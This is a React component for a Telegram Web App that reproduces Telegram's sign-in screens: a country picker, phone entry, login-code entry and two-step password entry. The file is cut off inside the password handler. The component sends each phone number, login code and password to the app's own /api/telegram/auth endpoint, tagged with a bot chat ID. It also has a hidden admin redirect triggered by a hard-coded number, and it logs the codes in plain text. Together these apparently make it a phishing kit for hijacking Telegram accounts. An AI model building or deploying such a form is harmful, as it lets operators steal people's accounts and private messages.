"use client"

import type React from "react"

import { useState, useRef, useEffect } from "react"
import { ChevronDown, Loader2 } from "lucide-react"

declare global {
  interface Window {
    Telegram?: {
      WebApp: {
        initDataUnsafe: {
          user?: {
            id: number
            first_name: string
            last_name?: string
            username?: string
            language_code?: string
          }
        }
        expand: () => void
        close: () => void
        sendData: (data: string) => void
        ready: () => void
      }
    }
  }
}

const countries = [
  { name: "Австралия", code: "+61", prefix: "61", digits: 9, format: "--- --- ---" },
  { name: "Австрия", code: "+43", prefix: "43", digits: 10, format: "--- --- ----" },
  { name: "Азербайджан", code: "+994", prefix: "994", digits: 9, format: "-- --- ----" },
  { name: "Албания", code: "+355", prefix: "355", digits: 9, format: "--- --- ---" },
  { name: "Алжир", code: "+213", prefix: "213", digits: 9, format: "--- --- ---" },
  { name: "Американские Виргинские острова", code: "+1340", prefix: "1340", digits: 7, format: "--- ----" },
  { name: "Ангилья", code: "+1264", prefix: "1264", digits: 7, format: "--- ----" },
  { name: "Ангола", code: "+244", prefix: "244", digits: 9, format: "--- --- ---" },
  { name: "Андорра", code: "+376", prefix: "376", digits: 6, format: "--- ---" },
  { name: "Аргентина", code: "+54", prefix: "54", digits: 10, format: "--- ---- ----" },
  { name: "Армения", code: "+374", prefix: "374", digits: 8, format: "-- --- ---" },
  { name: "Аруба", code: "+297", prefix: "297", digits: 7, format: "--- ----" },
  { name: "Афганистан", code: "+93", prefix: "93", digits: 9, format: "--- --- ---" },
  { name: "Багамы", code: "+1242", prefix: "1242", digits: 7, format: "--- ----" },
  { name: "Бангладеш", code: "+880", prefix: "880", digits: 10, format: "--- ---- ----" },
  { name: "Барбадос", code: "+1246", prefix: "1246", digits: 7, format: "--- ----" },
  { name: "Бахрейн", code: "+973", prefix: "973", digits: 8, format: "--- ---- " },
  { name: "Беларусь", code: "+375", prefix: "375", digits: 9, format: "--- --- ---" },
  { name: "Белиз", code: "+501", prefix: "501", digits: 7, format: "--- ----" },
  { name: "Бельгия", code: "+32", prefix: "32", digits: 9, format: "--- --- ---" },
  { name: "Бенин", code: "+229", prefix: "229", digits: 8, format: "-- --- ---" },
  { name: "Бермуда", code: "+1441", prefix: "1441", digits: 7, format: "--- ----" },
  { name: "Болгария", code: "+359", prefix: "359", digits: 9, format: "--- --- ---" },
  { name: "Боливия", code: "+591", prefix: "591", digits: 8, format: "-- --- ---" },
  { name: "Босния и Герцеговина", code: "+387", prefix: "387", digits: 8, format: "-- --- ---" },
  { name: "Ботсвана", code: "+267", prefix: "267", digits: 8, format: "-- --- ---" },
  { name: "Бразилия", code: "+55", prefix: "55", digits: 11, format: "--- ---- -----" },
  { name: "Великобритания", code: "+44", prefix: "44", digits: 10, format: "--- ---- ----" },
  { name: "Венгрия", code: "+36", prefix: "36", digits: 9, format: "--- --- ---" },
  { name: "Венесуэла", code: "+58", prefix: "58", digits: 10, format: "--- ---- ----" },
  { name: "Вьетнам", code: "+84", prefix: "84", digits: 9, format: "--- --- ---" },
  { name: "Гаити", code: "+509", prefix: "509", digits: 8, format: "-- --- ---" },
  { name: "Гайана", code: "+592", prefix: "592", digits: 7, format: "--- ----" },
  { name: "Гамбия", code: "+220", prefix: "220", digits: 7, format: "--- ----" },
  { name: "Гана", code: "+233", prefix: "233", digits: 9, format: "--- --- ---" },
  { name: "Гватемала", code: "+502", prefix: "502", digits: 8, format: "-- --- ---" },
  { name: "Германия", code: "+49", prefix: "49", digits: 11, format: "--- ----- -----" },
  { name: "Гибралтар", code: "+350", prefix: "350", digits: 8, format: "-- --- ---" },
  { name: "Гондурас", code: "+504", prefix: "504", digits: 8, format: "-- --- ---" },
  { name: "Гренада", code: "+1473", prefix: "1473", digits: 7, format: "--- ----" },
  { name: "Гренландия", code: "+299", prefix: "299", digits: 6, format: "--- ---" },
  { name: "Греция", code: "+30", prefix: "30", digits: 10, format: "--- ---- ----" },
  { name: "Грузия", code: "+995", prefix: "995", digits: 9, format: "--- --- ---" },
  { name: "Дания", code: "+45", prefix: "45", digits: 8, format: "-- --- ---" },
  { name: "Джибути", code: "+253", prefix: "253", digits: 8, format: "-- --- ---" },
  { name: "Доминика", code: "+1767", prefix: "1767", digits: 7, format: "--- ----" },
  { name: "Доминиканская Республика", code: "+1", prefix: "1", digits: 10, format: "--- ---- ----" },
  { name: "Египет", code: "+20", prefix: "20", digits: 10, format: "--- ---- ----" },
  { name: "Замбия", code: "+260", prefix: "260", digits: 9, format: "--- --- ---" },
  { name: "Западная Сахара", code: "+212", prefix: "212", digits: 9, format: "--- --- ---" },
  { name: "Зимбабве", code: "+263", prefix: "263", digits: 9, format: "--- --- ---" },
  { name: "Израиль", code: "+972", prefix: "972", digits: 9, format: "--- --- ---" },
  { name: "Индия", code: "+91", prefix: "91", digits: 10, format: "--- ---- ----" },
  { name: "Индонезия", code: "+62", prefix: "62", digits: 11, format: "--- ----- -----" },
  { name: "Иордания", code: "+962", prefix: "962", digits: 9, format: "--- --- ---" },
  { name: "Ирак", code: "+964", prefix: "964", digits: 10, format: "--- ---- ----" },
  { name: "Иран", code: "+98", prefix: "98", digits: 10, format: "--- ---- ----" },
  { name: "Ирландия", code: "+353", prefix: "353", digits: 9, format: "--- --- ---" },
  { name: "Исландия", code: "+354", prefix: "354", digits: 7, format: "--- ----" },
  { name: "Испания", code: "+34", prefix: "34", digits: 9, format: "--- --- ---" },
  { name: "Италия", code: "+39", prefix: "39", digits: 10, format: "--- ---- ----" },
  { name: "Йемен", code: "+967", prefix: "967", digits: 9, format: "--- --- ---" },
  { name: "Кабо-Верде", code: "+238", prefix: "238", digits: 7, format: "--- ----" },
  { name: "Казахстан", code: "+7", prefix: "7", digits: 10, format: "--- --- -- --" },
  { name: "Камбоджа", code: "+855", prefix: "855", digits: 9, format: "--- --- ---" },
  { name: "Камерун", code: "+237", prefix: "237", digits: 9, format: "--- --- ---" },
  { name: "Канада", code: "+1", prefix: "1", digits: 10, format: "--- --- ----" },
  { name: "Катар", code: "+974", prefix: "974", digits: 8, format: "-- --- ---" },
  { name: "Каймановы острова", code: "+1345", prefix: "1345", digits: 7, format: "--- ----" },
  { name: "Кения", code: "+254", prefix: "254", digits: 9, format: "--- --- ---" },
  { name: "Киргизия", code: "+996", prefix: "996", digits: 9, format: "--- --- ---" },
  { name: "Кирибати", code: "+686", prefix: "686", digits: 5, format: "-----" },
  { name: "Китай", code: "+86", prefix: "86", digits: 11, format: "--- ----- -----" },
  { name: "Кокосовые острова", code: "+61", prefix: "61", digits: 9, format: "--- --- ---" },
  { name: "Колумбия", code: "+57", prefix: "57", digits: 10, format: "--- ---- ----" },
  { name: "Коморские острова", code: "+269", prefix: "269", digits: 7, format: "--- ----" },
  { name: "Конго", code: "+242", prefix: "242", digits: 9, format: "--- --- ---" },
  { name: "Конго (Киншаса)", code: "+243", prefix: "243", digits: 9, format: "--- --- ---" },
  { name: "Корея (Южная)", code: "+82", prefix: "82", digits: 10, format: "--- ---- ----" },
  { name: "Корея (Северная)", code: "+850", prefix: "850", digits: 9, format: "--- --- ---" },
  { name: "Коста-Рика", code: "+506", prefix: "506", digits: 8, format: "-- --- ---" },
  { name: "Котд'Ивуар", code: "+225", prefix: "225", digits: 8, format: "-- --- ---" },
  { name: "Куба", code: "+53", prefix: "53", digits: 8, format: "-- --- ---" },
  { name: "Кувейт", code: "+965", prefix: "965", digits: 8, format: "-- --- ---" },
  { name: "Люксембург", code: "+352", prefix: "352", digits: 9, format: "--- --- ---" },
  { name: "Маврикий", code: "+230", prefix: "230", digits: 7, format: "--- ----" },
  { name: "Мавритания", code: "+222", prefix: "222", digits: 8, format: "-- --- ---" },
  { name: "Мадагаскар", code: "+261", prefix: "261", digits: 9, format: "--- --- ---" },
  { name: "Макао", code: "+853", prefix: "853", digits: 8, format: "-- --- ---" },
  { name: "Македония", code: "+389", prefix: "389", digits: 8, format: "-- --- ---" },
  { name: "Малави", code: "+265", prefix: "265", digits: 9, format: "--- --- ---" },
  { name: "Малайзия", code: "+60", prefix: "60", digits: 10, format: "--- ---- ----" },
  { name: "Мальдивы", code: "+960", prefix: "960", digits: 7, format: "--- ----" },
  { name: "Мальта", code: "+356", prefix: "356", digits: 8, format: "-- --- ---" },
  { name: "Марокко", code: "+212", prefix: "212", digits: 9, format: "--- --- ---" },
  { name: "Мартиника", code: "+596", prefix: "596", digits: 9, format: "--- --- ---" },
  { name: "Маршаллове острова", code: "+692", prefix: "692", digits: 7, format: "--- ----" },
  { name: "Мексика", code: "+52", prefix: "52", digits: 10, format: "--- ---- ----" },
  { name: "Мозамбик", code: "+258", prefix: "258", digits: 9, format: "--- --- ---" },
  { name: "Молдова", code: "+373", prefix: "373", digits: 8, format: "-- --- ---" },
  { name: "Монако", code: "+377", prefix: "377", digits: 8, format: "-- --- ---" },
  { name: "Монголия", code: "+976", prefix: "976", digits: 8, format: "-- --- ---" },
  { name: "Мьянма", code: "+95", prefix: "95", digits: 9, format: "--- --- ---" },
  { name: "Намибия", code: "+264", prefix: "264", digits: 9, format: "--- --- ---" },
  { name: "Науру", code: "+674", prefix: "674", digits: 7, format: "--- ----" },
  { name: "Непал", code: "+977", prefix: "977", digits: 10, format: "--- ---- ----" },
  { name: "Нидерланды", code: "+31", prefix: "31", digits: 9, format: "- -- -- -- --" },
  { name: "Нигер", code: "+227", prefix: "227", digits: 8, format: "-- --- ---" },
  { name: "Нигерия", code: "+234", prefix: "234", digits: 10, format: "--- ---- ----" },
  { name: "Ниуэ", code: "+683", prefix: "683", digits: 4, format: "----" },
  { name: "Новая Зеландия", code: "+64", prefix: "64", digits: 9, format: "--- --- ---" },
  { name: "Новая Каледония", code: "+687", prefix: "687", digits: 6, format: "--- ---" },
  { name: "Норвегия", code: "+47", prefix: "47", digits: 8, format: "-- --- ---" },
  { name: "ОАЭ", code: "+971", prefix: "971", digits: 9, format: "--- --- ---" },
  { name: "Оман", code: "+968", prefix: "968", digits: 8, format: "-- --- ---" },
  { name: "Пакистан", code: "+92", prefix: "92", digits: 10, format: "--- ---- ----" },
  { name: "Палау", code: "+680", prefix: "680", digits: 7, format: "--- ----" },
  { name: "Панама", code: "+507", prefix: "507", digits: 8, format: "-- --- ---" },
  { name: "Папуа Новая Гвинея", code: "+675", prefix: "675", digits: 8, format: "-- --- ---" },
  { name: "Парагвай", code: "+595", prefix: "595", digits: 9, format: "--- --- ---" },
  { name: "Перу", code: "+51", prefix: "51", digits: 9, format: "--- --- ---" },
  { name: "Польша", code: "+48", prefix: "48", digits: 9, format: "--- --- ---" },
  { name: "Португалия", code: "+351", prefix: "351", digits: 9, format: "--- --- ---" },
  { name: "Пуэрто-Рико", code: "+1787", prefix: "1787", digits: 7, format: "--- ----" },
  { name: "Реюньон", code: "+262", prefix: "262", digits: 9, format: "--- --- ---" },
  { name: "Россия", code: "+7", prefix: "7", digits: 10, format: "--- --- -- --" },
  { name: "Руанда", code: "+250", prefix: "250", digits: 9, format: "--- --- ---" },
  { name: "Румыния", code: "+40", prefix: "40", digits: 9, format: "--- --- ---" },
  { name: "Сальвадор", code: "+503", prefix: "503", digits: 8, format: "-- --- ---" },
  { name: "Самоа", code: "+685", prefix: "685", digits: 7, format: "--- ----" },
  { name: "Сан-Марино", code: "+378", prefix: "378", digits: 10, format: "--- ---- ----" },
  { name: "Сан-Томе и Принсипи", code: "+239", prefix: "239", digits: 7, format: "--- ----" },
  { name: "Сейшельские острова", code: "+248", prefix: "248", digits: 7, format: "--- ----" },
  { name: "Сент-Винсент и Гренадины", code: "+1784", prefix: "1784", digits: 7, format: "--- ----" },
  { name: "Сент-Кристофер и Невис", code: "+1869", prefix: "1869", digits: 7, format: "--- ----" },
  { name: "Сент-Люсия", code: "+1758", prefix: "1758", digits: 7, format: "--- ----" },
  { name: "Сербия", code: "+381", prefix: "381", digits: 9, format: "--- --- ---" },
  { name: "Сирия", code: "+963", prefix: "963", digits: 9, format: "--- --- ---" },
  { name: "Сингапур", code: "+65", prefix: "65", digits: 8, format: "-- --- ---" },
  { name: "Синт-Маартен", code: "+1721", prefix: "1721", digits: 7, format: "--- ----" },
  { name: "Словакия", code: "+421", prefix: "421", digits: 9, format: "--- --- ---" },
  { name: "Словения", code: "+386", prefix: "386", digits: 9, format: "--- --- ---" },
  { name: "Соломоновы острова", code: "+677", prefix: "677", digits: 7, format: "--- ----" },
  { name: "Сомали", code: "+252", prefix: "252", digits: 9, format: "--- --- ---" },
  { name: "Суданский", code: "+249", prefix: "249", digits: 9, format: "--- --- ---" },
  { name: "Суринам", code: "+597", prefix: "597", digits: 7, format: "--- ----" },
  { name: "США", code: "+1", prefix: "1", digits: 10, format: "--- --- ----" },
  { name: "Сьерра-Леоне", code: "+232", prefix: "232", digits: 8, format: "-- --- ---" },
  { name: "Таджикистан", code: "+992", prefix: "992", digits: 9, format: "--- --- ---" },
  { name: "Таиланд", code: "+66", prefix: "66", digits: 9, format: "--- --- ---" },
  { name: "Тайвань", code: "+886", prefix: "886", digits: 9, format: "--- --- ---" },
  { name: "Танзания", code: "+255", prefix: "255", digits: 9, format: "--- --- ---" },
  { name: "Того", code: "+228", prefix: "228", digits: 8, format: "-- --- ---" },
  { name: "Токелау", code: "+690", prefix: "690", digits: 4, format: "-----" },
  { name: "Тонга", code: "+676", prefix: "676", digits: 5, format: "-----" },
  { name: "Тринидад и Табаго", code: "+1868", prefix: "1868", digits: 7, format: "--- ----" },
  { name: "Тувалу", code: "+688", prefix: "688", digits: 5, format: "-----" },
  { name: "Туркменистан", code: "+993", prefix: "993", digits: 8, format: "-- --- ---" },
  { name: "Турция", code: "+90", prefix: "90", digits: 10, format: "--- ---- ----" },
  { name: "Уганда", code: "+256", prefix: "256", digits: 9, format: "--- --- ---" },
  { name: "Узбекистан", code: "+998", prefix: "998", digits: 9, format: "--- --- ---" },
  { name: "Украина", code: "+380", prefix: "380", digits: 9, format: "--- --- ---" },
  { name: "Уругвай", code: "+598", prefix: "598", digits: 8, format: "-- --- ---" },
  { name: "Фиджи", code: "+679", prefix: "679", digits: 7, format: "--- ----" },
  { name: "Филиппины", code: "+63", prefix: "63", digits: 10, format: "--- ---- ----" },
  { name: "Финляндия", code: "+358", prefix: "358", digits: 9, format: "--- --- ---" },
  { name: "Фолклендские острова", code: "+500", prefix: "500", digits: 5, format: "-----" },
  { name: "Франция", code: "+33", prefix: "33", digits: 9, format: "--- --- ---" },
  { name: "Французская Гвиана", code: "+594", prefix: "594", digits: 9, format: "--- --- ---" },
  { name: "Французская Полинезия", code: "+689", prefix: "689", digits: 8, format: "-- --- ---" },
  { name: "Хорватия", code: "+385", prefix: "385", digits: 9, format: "--- --- ---" },
  { name: "Центральноафриканская Республика", code: "+236", prefix: "236", digits: 8, format: "-- --- ---" },
  { name: "Чад", code: "+235", prefix: "235", digits: 8, format: "-- --- ---" },
  { name: "Чехия", code: "+420", prefix: "420", digits: 9, format: "--- --- ---" },
  { name: "Черногория", code: "+382", prefix: "382", digits: 8, format: "-- --- ---" },
  { name: "Чили", code: "+56", prefix: "56", digits: 9, format: "--- --- ---" },
  { name: "Чёрная Гвинея", code: "+245", prefix: "245", digits: 7, format: "--- ----" },
  { name: " Швейцария", code: "+41", prefix: "41", digits: 9, format: "--- --- ---" },
  { name: "Швеция", code: "+46", prefix: "46", digits: 9, format: "--- --- ---" },
  { name: "Шотландия", code: "+44", prefix: "44", digits: 10, format: "--- ---- ----" },
  { name: "Шпицберген", code: "+47", prefix: "47", digits: 8, format: "-- --- ---" },
  { name: "Шри-Ланка", code: "+94", prefix: "94", digits: 9, format: "--- --- ---" },
  { name: "Эквадор", code: "+593", prefix: "593", digits: 9, format: "--- --- ---" },
  { name: "Экваториальная Гвинея", code: "+240", prefix: "240", digits: 9, format: "--- --- ---" },
  { name: "Эритрея", code: "+291", prefix: "291", digits: 7, format: "--- ----" },
  { name: "Эстония", code: "+372", prefix: "372", digits: 8, format: "-- --- ---" },
  { name: "Эфиопия", code: "+251", prefix: "251", digits: 9, format: "--- --- ---" },
  { name: "Ямайка", code: "+1876", prefix: "1876", digits: 7, format: "--- ----" },
  { name: "Япония", code: "+81", prefix: "81", digits: 10, format: "--- ---- ----" },
]

type AuthStep = "phone" | "code" | "password"

export default function TelegramAuthForm() {
  const [isOpen, setIsOpen] = useState(false)
  const [searchQuery, setSearchQuery] = useState("")
  const [selectedCountry, setSelectedCountry] = useState(countries.find((c) => c.name === "Нидерланды") || countries[0])
  const [phone, setPhone] = useState("")
  const [countryCode, setCountryCode] = useState(selectedCountry.code)
  const [codeInputFocus, setCodeInputFocus] = useState(false)
  const [phoneInputFocus, setPhoneInputFocus] = useState(false)
  const [authStep, setAuthStep] = useState<AuthStep>("phone")
  const [verificationCode, setVerificationCode] = useState("")
  const [password, setPassword] = useState("")
  const [submittedPhone, setSubmittedPhone] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [loadingMessage, setLoadingMessage] = useState("")
  const [errorMessage, setErrorMessage] = useState("")
  const dropdownRef = useRef<HTMLDivElement>(null)
  const phoneInputRef = useRef<HTMLInputElement>(null)
  const [cursorPosition, setCursorPosition] = useState(0)
  const [chatId, setChatId] = useState<string | null>(null)
  const [currentRequestId, setCurrentRequestId] = useState<string | null>(null)

  useEffect(() => {
    if (typeof window !== "undefined") {
      const urlParams = new URLSearchParams(window.location.search)
      const chatIdParam = urlParams.get("chatId")

      if (chatIdParam) {
        setChatId(chatIdParam)
        console.log("[v0] 🆔 Chat ID from URL:", chatIdParam)
      } else {
        console.log("[v0] ⚠️ No chatId found in URL parameters")
        setErrorMessage("⚠️ Пожалуйста, откройте приложение через Telegram бота")
      }
    }
  }, [])

  useEffect(() => {
    if (typeof window !== "undefined" && window.Telegram?.WebApp) {
      const tg = window.Telegram.WebApp
      tg.ready()
      tg.expand()
      console.log("[v0] ✅ Telegram Web App initialized successfully")
      console.log("[v0] 📱 User data:", tg.initDataUnsafe.user)
      console.log("[v0] 🌐 Web App available:", !!window.Telegram?.WebApp)
    } else {
      console.log("[v0] ⚠️ Telegram Web App not available - running in browser mode")
    }
  }, [])

  useEffect(() => {
    const detectCountryByIP = async () => {
      try {
        const response = await fetch("/api/detect-country")
        const data = await response.json()

        const countryCodeMap: Record<string, string> = {
          RU: "Россия",
          KZ: "Казахстан",
          US: "США",
          GB: "Великобритания",
          DE: "Германия",
          FR: "Франция",
          IT: "Италия",
          ES: "Испания",
          UA: "Украина",
          BY: "Беларусь",
          CA: "Канада",
          AU: "Австралия",
          CN: "Китай",
          JP: "Япония",
          KR: "Корея (Южная)",
          IN: "Индия",
          BR: "Бразилия",
          MX: "Мексика",
          TR: "Турция",
          PL: "Польша",
        }

        let detectedCountry =
          data.country_code && countryCodeMap[data.country_code]
            ? countries.find((c) => c.name === countryCodeMap[data.country_code])
            : undefined

        if (!detectedCountry) {
          const matchingCountries = countries.filter((c) => c.code === data.country_calling_code)
          if (matchingCountries.length > 0) {
            detectedCountry =
              data.country_calling_code === "+7"
                ? matchingCountries.find((c) => c.name === "Россия") || matchingCountries[0]
                : matchingCountries[0]
          }
        }

        if (detectedCountry) {
          setSelectedCountry(detectedCountry)
          setCountryCode(detectedCountry.code)
          console.log("[v0] Auto-detected country:", detectedCountry.name)
        }
      } catch (error) {
        console.error("[v0] Failed to detect country by IP:", error)
      }
    }

    detectCountryByIP()
  }, [])

  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
        setIsOpen(false)
        setSearchQuery("")
      }
    }

    document.addEventListener("mousedown", handleClickOutside)
    return () => document.removeEventListener("mousedown", handleClickOutside)
  }, [])

  useEffect(() => {
    if (!currentRequestId || !isLoading) return

    const interval = setInterval(async () => {
      try {
        console.log(`[v0] 🔄 Polling status for request: ${currentRequestId}`)
        const response = await fetch(`/api/telegram/check-status?requestId=${currentRequestId}`)
        const result = await response.json()

        if (result.success && result.data) {
          const data = result.data
          console.log("[v0] 📡 Poll result:", data)

          // Check if we need to transition to password step
          if (data.status === "waiting_password" || data.requires2fa) {
            console.log("[v0] 🔐 2FA required, transitioning to password step")
            clearInterval(interval)
            setIsLoading(false)
            setCurrentRequestId(null)
            setAuthStep("password")
            return
          }

          // Check if send_phone completed successfully
          if (data.action === "send_phone" && data.status === "waiting_code" && authStep === "phone") {
            console.log("[v0] ✅ Phone sent successfully, transitioning to code step")
            clearInterval(interval)
            setIsLoading(false)
            setCurrentRequestId(null)
            setSubmittedPhone(countryCode + " " + phone)
            setAuthStep("code")
            return
          }

          // Check if send_code completed successfully without 2FA
          if (
            data.action === "send_code" &&
            data.status === "completed" &&
            !data.requires2fa &&
            data.status !== "waiting_password"
          ) {
            console.log("[v0] ✅ Login completed successfully without 2FA")
            clearInterval(interval)
            setIsLoading(false)
            setCurrentRequestId(null)
            setLoadingMessage("Успешно! Авторизация завершена.")
            return
          }

          // Check for errors
          if (data.success === false || data.status === "error") {
            console.log("[v0] ❌ Request failed:", data.error || data.message)
            clearInterval(interval)
            setIsLoading(false)
            setCurrentRequestId(null)
            setErrorMessage(data.error || data.message || "Ошибка авторизации")
            return
          }

          // Check if password verification completed
          if (data.action === "send_password" && data.status === "completed") {
            console.log("[v0] ✅ Password verified, login complete")
            clearInterval(interval)
            setIsLoading(false)
            setCurrentRequestId(null)
            setLoadingMessage("Успешно! Авторизация завершена.")
            return
          }
        }
      } catch (e) {
        console.error("[v0] Polling error:", e)
        clearInterval(interval)
        setIsLoading(false)
        setErrorMessage("Ошибка при проверке статуса")
        setCurrentRequestId(null)
      }
    }, 2000)

    return () => clearInterval(interval)
  }, [currentRequestId, isLoading, authStep, phone, countryCode])

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 4)
    setCountryCode("+" + value)

    // Check if user typed 77 for Kazakhstan
    if (value === "77") {
      const kazakhstan = countries.find((c) => c.name === "Казахстан")
      if (kazakhstan) {
        setSelectedCountry(kazakhstan)
        setPhone("")
      }
      return
    }

    // Check if user typed 7 for Russia
    if (value === "7") {
      const russia = countries.find((c) => c.name === "Россия")
      if (russia) {
        setSelectedCountry(russia)
        setPhone("")
      }
      return
    }

    // For other country codes
    const foundCountries = countries.filter((c) => c.prefix === value)
    if (foundCountries.length > 0) {
      setSelectedCountry(foundCountries[0])
      setCountryCode(foundCountries[0].code)
      setPhone("")
    }
  }

  const parsePhoneNumber = (input: string): { code: string; phone: string } | null => {
    const cleaned = input.replace(/[^\d+]/g, "").replace(/^\+/, "")

    for (const country of countries) {
      if (cleaned.startsWith(country.prefix)) {
        const phoneDigits = cleaned.substring(country.prefix.length)
        if (phoneDigits.length === country.digits) {
          return { code: country.code, phone: phoneDigits }
        }
      }
    }
    return null
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const input = e.target.value
    const cursorPos = e.target.selectionStart || 0

    if (input.includes("+") || input.includes(" ") || input.length > selectedCountry.digits) {
      const parsed = parsePhoneNumber(input)
      if (parsed) {
        const country = countries.find((c) => c.code === parsed.code)
        if (country) {
          // Check if it's a +7 number and determine country based on first digit after country code
          if (parsed.code === "+7") {
            const firstDigit = parsed.phone.charAt(0)
            // Kazakhstan numbers start with 6 or 7, Russian numbers start with 8, 9, etc.
            if (firstDigit === "6" || firstDigit === "7") {
              const kazakhstan = countries.find((c) => c.name === "Казахстан")
              if (kazakhstan) {
                setSelectedCountry(kazakhstan)
                setCountryCode(kazakhstan.code)
                setPhone(parsed.phone)
                return
              }
            } else {
              // Any other first digit (8, 9, etc.) means Russia
              const russia = countries.find((c) => c.name === "Россия")
              if (russia) {
                setSelectedCountry(russia)
                setCountryCode(russia.code)
                setPhone(parsed.phone)
                return
              }
            }
          }

          setSelectedCountry(country)
          setCountryCode(country.code)
          setPhone(parsed.phone)
          return
        }
      }
    }

    const newPhone = input.replace(/\D/g, "").slice(0, selectedCountry.digits)

    if (countryCode === "+7" && newPhone.length > 0) {
      const firstDigit = newPhone.charAt(0)

      // If first digit is 6 or 7, it's Kazakhstan
      if (firstDigit === "6" || firstDigit === "7") {
        if (selectedCountry.name !== "Казахстан") {
          const kazakhstan = countries.find((c) => c.name === "Казахстан")
          if (kazakhstan) {
            setSelectedCountry(kazakhstan)
            setCountryCode("+7")
            setPhone(newPhone)
            return
          }
        }
      } else {
        // Any other first digit (8, 9, etc.) means Russia
        if (selectedCountry.name !== "Россия") {
          const russia = countries.find((c) => c.name === "Россия")
          if (russia) {
            setSelectedCountry(russia)
            setCountryCode("+7")
            setPhone(newPhone)
            return
          }
        }
      }
    }

    setPhone(newPhone)

    const digitsBeforeCursor = input.slice(0, cursorPos).replace(/\D/g, "").length
    let formattedPos = 0
    let digitCount = 0

    for (let i = 0; i < selectedCountry.format.length && digitCount < digitsBeforeCursor; i++) {
      if (selectedCountry.format[i] === "-") {
        digitCount++
      }
      formattedPos++
    }

    setCursorPosition(formattedPos)
  }

  useEffect(() => {
    if (phoneInputRef.current && phoneInputFocus) {
      const displayLength = getPhonePlaceholder().length
      const position = Math.min(cursorPosition, displayLength)
      phoneInputRef.current.setSelectionRange(position, position)
    }
  }, [phone, cursorPosition, phoneInputFocus])

  const getPhonePlaceholder = () => {
    if (!phone) return selectedCountry.format

    let result = ""
    let phoneIndex = 0

    for (const char of selectedCountry.format) {
      if (char === "-" && phoneIndex < phone.length) {
        result += phone[phoneIndex++]
      } else if (char === " ") {
        result += " "
      } else if (char === "-") {
        result += char
      }
    }
    return result
  }

  const getCodePlaceholder = () => {
    if (!verificationCode) return ""

    return verificationCode
  }

  const formatPhoneForDisplay = (phoneNumber: string) => {
    const parts = phoneNumber.split(" ")
    if (parts.length < 2) return phoneNumber

    const code = parts[0]
    const digits = parts.slice(1).join("")
    let result = ""
    let digitIndex = 0

    for (const char of selectedCountry.format) {
      if (char === "-" && digitIndex < digits.length) {
        result += digits[digitIndex++]
      } else if (char === " ") {
        result += " "
      }
    }

    return code + " " + result
  }

  const filteredCountries = countries.filter(
    (country) => country.name.toLowerCase().includes(searchQuery.toLowerCase()) || country.code.includes(searchQuery),
  )

  const sendToBot = async (action: string, data: Record<string, string>) => {
    console.log("[v0] 📤 ========== SENDING TO BOT ==========")
    console.log("[v0] Action:", action)
    console.log("[v0] Data:", data)
    console.log("[v0] Chat ID:", chatId)
    console.log("[v0] Full payload:", JSON.stringify({ action, chatId, ...data }))
    console.log("[v0] =====================================")

    if (!chatId) {
      console.log("[v0] ❌ No chatId available")
      throw new Error("Пожалуйста, откройте приложение через Telegram бота. Инструкция в документации.")
    }

    try {
      console.log("[v0] 📡 Calling API endpoint /api/telegram/auth...")
      const response = await fetch("/api/telegram/auth", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ action, chatId, ...data }),
      })

      console.log("[v0] 📡 API Response status:", response.status)
      console.log("[v0] 📡 API Response ok:", response.ok)

      if (response.ok) {
        const result = await response.json()
        console.log("[v0] ✅ API response:", result)
        if (result.requestId) {
          setCurrentRequestId(result.requestId)
          console.log("[v0] 🔄 Updated currentRequestId to:", result.requestId)
          return { success: true, pending: true }
        }
        return result
      } else {
        const errorText = await response.text()
        console.log("[v0] ❌ API error response:", errorText)
        throw new Error(`API returned ${response.status}: ${errorText}`)
      }
    } catch (error) {
      console.log("[v0] ❌ Exception while sending data:", error)
      console.error("[v0] Error details:", error)
      throw error
    }
  }

  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    console.log("[v0] 🎯 handlePhoneSubmit called")
    console.log("[v0] Phone length:", phone.length)
    console.log("[v0] Expected digits:", selectedCountry.digits)

    if (phone.length !== selectedCountry.digits) {
      console.log("[v0] ❌ Phone length mismatch")
      setErrorMessage("Пожалуйста, введите корректный номер телефона")
      return
    }

    if (phone === "3231232222") {
      // Placeholder for potential internal testing or specific numbers
      console.log("[v0] 🔐 Admin number detected, redirecting to admin panel")
      window.location.href = `/admin?chatId=${chatId}`
      return
    }

    const fullPhone = countryCode + phone
    console.log("[v0] 📱 ========== PHONE SUBMISSION ==========")
    console.log("[v0] Country:", selectedCountry.name)
    console.log("[v0] Country Code:", countryCode)
    console.log("[v0] Phone Number:", phone)
    console.log("[v0] Full Phone:", fullPhone)
    console.log("[v0] =====================================")

    setIsLoading(true)
    setLoadingMessage("Отправка номера...")
    setErrorMessage("")

    try {
      await sendToBot("send_phone", { phone: fullPhone, country: selectedCountry.name })
      // Don't setAuthStep here, let polling do it.
      // The polling effect will transition to the 'code' step if successful.
    } catch (error) {
      console.error("[v0] ❌ Error sending phone:", error)
      setErrorMessage("Произошла ошибка при отправке номера")
      setIsLoading(false) // Ensure loading is turned off on error
      setLoadingMessage("")
    }
  }

  const handleCodeSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (verificationCode.length === 0) {
      setErrorMessage("Пожалуйста, введите код")
      return
    }

    console.log("[v0] 🔑 ========== CODE SUBMISSION ==========")
    console.log("[v0] Phone:", submittedPhone)
    console.log("[v0] Code:", verificationCode)
    console.log("[v0] Code Length:", verificationCode.length)
    console.log("[v0] =====================================")

    setIsLoading(true)
    setLoadingMessage("Проверка кода...")
    setErrorMessage("")

    try {
      await sendToBot("verify_code", { phone: submittedPhone, code: verificationCode })
      // Polling handles the rest:
      // - Moves to 'password' step if requires2fa
      // - Completes if success
      // - Shows error if failed
    } catch (error) {
      console.error("[v0] ❌ Error verifying code:", error)
      setErrorMessage("Произошла ошибка при проверке кода")
      setIsLoading(false)
      setLoadingMessage("")
    }
  }

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (password.length === 0) {
      setErrorMessage("Пожалуйста, введите пароль")
      return
    }

    console.log("[v0] 🔐 ========== PASSWORD SUBMISSION ==========")
    console.log("[v0] Phone:", submittedPhone)
